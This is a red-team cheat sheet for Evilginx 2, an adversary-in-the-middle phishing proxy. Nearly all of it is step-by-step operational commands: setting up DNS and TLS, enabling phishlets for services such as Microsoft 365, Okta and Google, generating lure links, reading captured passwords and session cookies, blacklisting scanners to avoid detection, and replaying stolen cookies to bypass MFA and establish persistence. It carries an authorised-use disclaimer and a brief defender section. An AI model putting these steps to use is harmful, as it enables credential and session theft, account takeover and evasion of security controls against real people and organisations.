Evilginx 2 - Cheat Sheet

Evilginx 2 is a standalone Adversary-in-the-Middle (AiTM) reverse-proxy
framework. It sits between the victim and the real login site, proxies the
whole authentication flow (including MFA), and captures the resulting SESSION
COOKIES / tokens. Replaying those cookies logs you in without redoing MFA.
Unlike v1 it is fully standalone (its own HTTP + DNS server - no nginx).

>>> AUTHORIZED ENGAGEMENTS ONLY. Use solely with written permission for a
    sanctioned phishing / red-team assessment. <<<
Replace the placeholders (<...>) with your own values.


Two building blocks to understand first
  - Phishlet: a YAML config that tells Evilginx how to proxy a specific site
    (which hosts to relay, which cookies/fields are the loot). Per-target.
  - Lure: a generated phishing URL tied to a phishlet - this is the link you
    send. Each lure can have its own redirect and settings.


Step 1 - Install and run (on your VPS)

Evilginx 2 is written in Go:

    git clone https://github.com/kgretzky/evilginx2
    cd evilginx2 && make
    sudo ./bin/evilginx -p ./phishlets/

Port 53 (DNS), 80 and 443 must be free and allowed inbound. Run as root.


Step 2 - DNS: point your domain at the Evilginx server

Evilginx runs its own DNS server. At your registrar, set the domain's
nameservers (glue records) to the VPS, e.g.:

    ns1.<phish-domain>  ->  <vps-ip>
    ns2.<phish-domain>  ->  <vps-ip>

This lets Evilginx answer for every subdomain it needs and auto-issue TLS
certs via Let's Encrypt. Verify: dig NS <phish-domain> returns your VPS.


Step 3 - Core config

In the Evilginx console:

    config domain <phish-domain>
    config ip <vps-ip>

(Newer 3.x builds use: config ipv4 external <vps-ip>.)
Settings persist in ~/.evilginx/config.json.


Step 4 - Set up a phishlet

List, bind a hostname, and enable the phishlet for your target service:

    phishlets                                  # list available phishlets
    phishlets hostname <name> <phish-domain>   # e.g. o365 / okta / google
    phishlets enable <name>

Enabling triggers automatic Let's Encrypt cert issuance for the hostnames.
If a phishlet is outdated (login pages change often), edit its YAML in
./phishlets/<name>.yaml (proxy_hosts, sub_filters, auth_tokens, credentials).


Step 5 - Create a lure (the link you send)

    lures create <name>
    lures                          # list lures with their IDs
    lures get-url <id>             # the phishing URL to deliver
    lures edit <id> redirect_url https://<legit-site>   # post-login redirect
    lures edit <id> hostname <custom-host>.<phish-domain>

Send the get-url link through the channel approved in your engagement.


Step 6 - Watch for captured sessions

When a victim logs in (and completes MFA) through the lure:

    sessions                       # list captured sessions
    sessions <id>                  # username + password + tokens/cookies

The "tokens" block is the prize - those are the authenticated session cookies.
A session only shows as fully captured once the auth_tokens are collected.


Step 7 - Block scanners / bots (opsec + cleaner captures)

Mail security and crawlers will hit your lure. Blacklist them so they don't
trip the phishlet or burn your domain:

    blacklist unauth          # block IPs that hit non-lure paths
    blacklist noadd           # log but don't add (observe first)
    blacklist all             # block everything not visiting a valid lure

Also: lures edit <id> redirect_url <legit-site> sends non-victims away.


Step 8 - Replay the session (skip MFA)

Take the captured cookies and import them into your browser:
  - Install a cookie-editor extension.
  - Paste the session cookies (e.g. ESTSAUTH for M365) for the real domain.
  - Browse to the service (https://office.com) - you're logged in as the
    victim with no MFA prompt.
  - Pivot: see the entra-id-attacks cheatsheet to enumerate the tenant
    (ROADrecon / AzureHound) and establish persistence before the cookie dies.


Troubleshooting
  - Cert errors -> DNS not pointing at the VPS yet, or 80/443 blocked
    (Let's Encrypt validation fails). Recheck dig NS and firewall.
  - Login loops / blank page -> phishlet out of date; update sub_filters.
  - No tokens captured -> auth_tokens in the phishlet don't match the
    current cookie names; inspect the real site and fix the YAML.


Defender notes (put these in the report)
  - Phishing-resistant MFA (FIDO2 / passkeys, certificate-based) defeats
    Evilginx - the credential is bound to the real origin and won't proxy.
  - Conditional Access: require compliant/managed device + token protection.
  - Hunt: sign-ins from hosting ASNs, impossible travel, new-device logins,
    look-alike domains in mail gateways.


Key idea: Evilginx 2 weaponises the AiTM concept into a turnkey tool. You don't
phish the password or the MFA code - you proxy the genuine login so the victim
completes MFA on the real server, and you walk away with the authenticated
session cookie. Phishlets define HOW to proxy a target; lures are the links you
send; sessions hold the loot. Authorized testing only.
